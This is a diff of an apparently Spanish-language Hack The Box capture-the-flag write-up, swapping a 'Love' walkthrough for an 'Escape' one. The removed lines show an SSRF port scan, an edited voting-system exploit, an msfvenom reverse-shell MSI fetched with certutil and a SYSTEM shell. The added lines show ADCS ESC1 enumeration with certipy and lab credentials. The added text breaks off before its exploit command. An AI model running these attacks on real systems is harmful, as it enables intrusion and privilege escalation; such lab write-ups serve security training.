@@ -1,7 +1,8 @@
 ---
 layout: single
 title: Hack The Box - Escape
-excerpt: "Love es una máquina de dificultad fácil en Hack The Box que requiere explotar una vulnerabilidad de tipo SSRF (Server Side Request Forgery) para acceder a credenciales expuestas en un servicio interno. Estas credenciales permiten ejecutar un exploit autenticado contra el sistema de votaciones. La escalada de privilegios resulta especialmente interesante, ya que se aprovecha la política de Windows denominada AlwaysInstallElevated para lograr la ejecución de código con privilegios administrativos."
+excerpt: "Escape es una máquina de dificultad Media en Hack The Box. El reto comienza con la enumeración del servicio SMB, donde se identifica un archivo PDF que contiene contraseñas. Posteriormente, se aprovecha la función xp_dirtree para obtener un hash como el usuario sql_svc.
+Una enumeración básica permite escalar a otro usuario, y finalmente, para la escalada de privilegios, se abusa de la configuración ESC1 de los Servicios de Certificados de Active Directory (ADCS). Esto permite obtener el hash del usuario administrador y realizar un Pass the Hash, logrando así una shell con privilegios de administrador en el sistema."
 date: 2025-08-16
 classes: wide
 header:
@@ -10,11 +11,12 @@ header:
   icon: /assets/images/hackthebox.webp
 categories:
   - Hackthebox
-  - Web Pentesting
+  - Active Directory
 tags:  
-  - Voting System 
-  - AlwaysInstallElevated
-  - SSRF
+  - certipy 
+  - MSSQL
+  - SMB
+  - ESC1
 
 ---
 <style>
@@ -41,7 +43,7 @@ tags:
     width: 90%;
     max-width: 400px;
     height: 300px;
-    background-image: url("/assets/images/htb-writeup-Love/love.png");
+    background-image: url("/assets/images/htb-writeup-Escape/Escape.png");
     background-size: cover;
     background-position: center;
     margin: 2rem auto 1rem auto;
@@ -55,7 +57,7 @@ tags:
     left: 0;
     width: 100%;
     height: 100%;
-    background-image: url("/assets/images/htb-writeup-Love/love.png");
+    background-image: url("/assets/images/htb-writeup-Escape/Escape.png");
     background-size: cover;
     background-position: center;
     opacity: 0.5;
@@ -144,9 +146,10 @@ tags:
 
 <br>
 
-`Escape` es una máquina de dificultad fácil en Hack The Box que requiere explotar una vulnerabilidad de tipo SSRF (Server Side Request Forgery) para acceder a credenciales expuestas en un servicio interno. Estas credenciales permiten ejecutar un exploit autenticado contra el sistema de votaciones. La escalada de privilegios resulta especialmente interesante, ya que se aprovecha la política de Windows denominada AlwaysInstallElevated para lograr la ejecución de código con privilegios administrativos.
+`Escape` es una máquina de dificultad Media en Hack The Box. El reto comienza con la enumeración del servicio SMB, donde se identifica un archivo PDF que contiene contraseñas. Posteriormente, se aprovecha la función xp_dirtree para obtener un hash como el usuario sql_svc.
+Una enumeración básica permite escalar a otro usuario, y finalmente, para la escalada de privilegios, se abusa de la configuración ESC1 de los Servicios de Certificados de Active Directory (ADCS). Esto permite obtener el hash del usuario administrador y realizar un Pass the Hash, logrando así una shell con privilegios de administrador en el sistema.
 
-## Enumeración
+##Enumeración
 
 Realizando un escaneo de puertos TCP identifique los siguientes abiertos:
 
@@ -475,246 +478,92 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
 sequel\ryan.cooper
 ```
+## Escalada de privilegios
 
-
-
-
-
-Tras revisar el sitio web alojado en el puerto 5000 solamente me encontré con un`Forbidden
-` 
-
-![](/assets/images/htb-writeup-Love/forbidden.png)
-
-Posteriormente revise el sitio web alojado en el subdominio `staging.love.htb` el cual se trata de un sitio de escaneo de archivos libre 
-
-![](/assets/images/htb-writeup-Love/free.png)
-
-## SSRF (Server Side Request Forgery)
-
-En Demo puede ingresarse una URL de un archivo para que se escanee 
-
-![](/assets/images/htb-writeup-Love/demo.png)
-
-Realice una prueba colocando un servidor temporal y llamando a un archivo de prueba, lo cual funciono, esto me da indicios de que pueda tratarse de una vulnerabilidad SSRF(Server Side Request Forgey) 
-
-```bash
-┌──(root㉿kali)-[/opt]
-└─# python3 -m http.server 80   
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.239 - - [27/Jun/2025 16:08:11] "GET /test.txt HTTP/1.1" 200 -
-```
-![](/assets/images/htb-writeup-Love/test.png)
-
-Para validar la vulnerabilidad copie el archivo `index.html` de apache, coloque un servidor temporal y llame al archivo 
-
-![](/assets/images/htb-writeup-Love/apache.png)
-
-Ahora que confirme la vulnerabilidad, llame un archivo interno del sistema a modo de ejemplo el cual también funciono con éxito
-
-![](/assets/images/htb-writeup-Love/etc.png)
-
-Algo que puede realizarse mediante un SSRF es una enumeración de puertos internos del sistema, primero genere una lista con los 65535 puertos 
-
-```bash
-for port in {1..65535};do echo $port >> ports.txt;done
-```
-
-Después realice una consulta a un puerto interno aleatorio que no esta abierto para ver el tamaño de la consulta cuando se realiza a puertos cerrados
-
-```bash
-┌──(root㉿kali)-[/opt/a]
-└─# curl -i -s -X POST http://staging.love.htb/beta.php -H "Content-Type: application/x-www-form-urlencoded" -d 'file=http://127.0.0.1:1&read=Scan+file'
-HTTP/1.1 200 OK
-Date: Fri, 27 Jun 2025 20:55:09 GMT
-Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
-X-Powered-By: PHP/7.3.27
-Content-Length: 4997
-Content-Type: text/html; charset=UTF-8
-
-<html>
-<title> File security checker </title>
-
-
-
-<!DOCTYPE html>
-<html>
-...SNIP...
-```
-
-El contenido a consultas donde el puerto esta cerrado es `4997`, con ffuf  realice un escaneo excluyendo las solicitudes con ese numero para poder enumerar puertos abiertos internos.
-
-```bash
-┌──(root㉿kali)-[/opt]
-└─# ffuf -w ./ports.txt:PORT -u http://staging.love.htb/beta.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "file=http://127.0.0.1:PORT&read=Scan+file" -fs 4997
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : POST
- :: URL              : http://staging.love.htb/beta.php
- :: Wordlist         : PORT: /opt/ports.txt
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Data             : file=http://127.0.0.1:PORT&read=Scan+file
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response size: 4997
-________________________________________________
-
-80                      [Status: 200, Size: 9385, Words: 1901, Lines: 337, Duration: 2118ms]
-443                     [Status: 200, Size: 5466, Words: 1296, Lines: 224, Duration: 240ms]
-```
-
-Finalmente, realice una petición al puerto 5000 que me marcaba `Forbidden` y pude  encontrar credenciales
-
-![](/assets/images/htb-writeup-Love/.passng)
-
-Al intentar probar las credenciales en el sistema de votación no funcionaron; sin embargo, hay un [exploit](https://www.exploit-db.com/exploits/49445)  para este sistema que como requisitos requieres estar autenticado así que lo probare 
-
-```bash
-# --- Edit your settings here ----
-IP = "love.htb" # Website's URL
-USERNAME = "admin" #Auth username
-PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
-REV_IP = "10.10.16.2" # Reverse shell IP
-REV_PORT = "443" # Reverse port 
-# --------------------------------
-```
-
-Pero al momento de ejecutarlo no funciono
-
-```bash
-┌──(root㉿kali)-[/opt]
-└─# python3 voting_system_exploits.py 
-Start a NC listner on the port you choose above and run...
-```                                                          
-
-Al analizar el epxloit veo que las siguientes rutas no las tiene el servidor
-
-```bash
-INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
-LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
-VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
-CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
-```
-
-por lo cual regresando a mi enumeración de archivos y directorios pude ver la ruta verdadera y actualice el exploit, posteriormente se ejecuto sin problemas
-
-```bash
-INDEX_PAGE = f"http://{IP}/admin/index.php"
-LOGIN_URL = f"http://{IP}/admin/login.php"
-VOTE_URL = f"http://{IP}/admin/voters_add.php"
-CALL_SHELL = f"http://{IP}/images/shell.php"
-```
-
-```bash
-┌──(root㉿kali)-[/opt]
-└─# python3 voting_system_exploits.py
-Start a NC listner on the port you choose above and run...
-Logged in
-Poc sent successfully
-```
+Una verificación fundamental al enumerar un dominio de Windows es identificar la presencia de Servicios de Certificados de Active Directory (ADCS), esto lo realice con netexec 
 
 ```bash
 ┌──(root㉿kali)-[/home/kali]
-└─# rlwrap nc -lvp 443
-listening on [any] 443 ...
-connect to [10.10.16.2] from love.htb [10.10.10.239] 54874
-b374k shell : connected
-
-Microsoft Windows [Version 10.0.19042.867]
-(c) 2020 Microsoft Corporation. All rights reserved.
-
-C:\xampp\htdocs\omrs\images>whoami
-whoami
-love\phoebe
-
-C:\xampp\htdocs\omrs\images>
+└─# nxc ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs      
+SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+LDAPS       10.10.11.202    636    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
+ADCS        10.10.11.202    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        10.10.11.202    389    DC               Found PKI Enrollment Server: dc.sequel.htb
+ADCS        10.10.11.202    389    DC               Found CN: sequel-DC-CA
 ```
-## Escalada de privilegios
-
-Para la escalación de privilegios ejecute winpeas y algo que llamo mi atención fue la siguiente linea:
+El resultado muestra un servidor ADCS activo (`dc.sequel.htb` con la CA `sequel-DC-CA`) que gestiona certificados en el dominio esto abre la puerta a **ataques contra ADCS**, como _ESC1, ESC8 o ESC13_, dependiendo de la configuración. Por lo cual utilice certipy para realizar la enumeración.
 
 ```bash
-Checking AlwaysInstallElevated
- https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
-    AlwaysInstallElevated set to 1 in HKLM!
-    AlwaysInstallElevated set to 1 in HKCU!
+┌──(root㉿kali)-[/home/kali/escape]
+└─# certipy-ad find -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -enabled -text
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
+[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Saving text output to '20250812044641_Certipy.txt'
+[*] Wrote text output to '20250812044641_Certipy.txt'
 ```
-
-Después de una investigación encontré que Windows incluye una configuración de política llamada `AlwaysInstallElevated`, al estar habilitada tanto en el ámbito de usuario como en el de equipo, permite que los instaladores MSI se ejecuten con privilegios elevados, incluso si los inicia un usuario estándar. Para determinar que se encuentra esta configuración el valor  `AlwaysInstallElevated`debe estar establecido en 1 en las siguientes llaves:
-
-- `HKLM\Software\Policies\Microsoft\Windows\Installer`
-- `HKCU\Software\Policies\Microsoft\Windows\Installer`
-
-primero comprobé el valor de ambas llaves
+Al consultar el archivo se puede encontrar una plantilla vulnerable a _ESC1_ 
 
 ```bash
-PS C:\Users\Phoebe> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-
-HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
-    AlwaysInstallElevated    REG_DWORD    0x1
-
-PS C:\Users\Phoebe> reg query HKCU\Software\Policies\Microsoft\Windows\Installer
-reg query HKCU\Software\Policies\Microsoft\Windows\Installer
-
-HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-    AlwaysInstallElevated    REG_DWORD    0x1
+Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2022-11-18T21:10:22+00:00
+    Template Last Modified              : 2024-01-19T00:26:38+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Full Control Principals         : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Property Enroll           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
 ```
+Para explotarla utilice el siguiente comando:
 
-Para la explotación utilice msfvenom para crear un archivo msi 
-
-```bash
-┌──(root㉿kali)-[/opt/chuleta]
-└─#  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=4443 -f msi > p3rr1n.msi
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: 324 bytes
-Final size of msi file: 159744 bytes
-```
-
-Después pase el archivo a la maquina victima
-
-```bash
-PS C:\Users\Phoebe> certutil.exe -f -urlcache -split http://10.10.16.2/p3rr1n.msi p3rr1n.msi
-certutil.exe -f -urlcache -split http://10.10.16.2/p3rr1n.msi p3rr1n.msi
-****  Online  ****
-  000000  ...
-  027000
-CertUtil: -URLCache command completed successfully.
-```
-
-Finalmente coloque mi listener en el puerto 4443 y ejecute el archivo msi para recibir la shell como administrador
-
-```bash
-PS C:\Users\Phoebe> msiexec /quiet /qn /i C:\Users\Phoebe\p3rr1n.msi
-msiexec /quiet /qn /i C:\Users\Phoebe\p3rr1n.msi
-PS C:\Users\Phoebe> 
-```
-
-```bash
-┌──(root㉿kali)-[/opt/chuleta]
-└─# nc -lvp 4443
-listening on [any] 4443 ...
-connect to [10.10.16.2] from love.htb [10.10.10.239] 61650
-Microsoft Windows [Version 10.0.19042.867]
-(c) 2020 Microsoft Corporation. All rights reserved.
-
-C:\WINDOWS\system32>whoami
-whoami
-nt authority\system
-
-C:\WINDOWS\system32>
-```
  
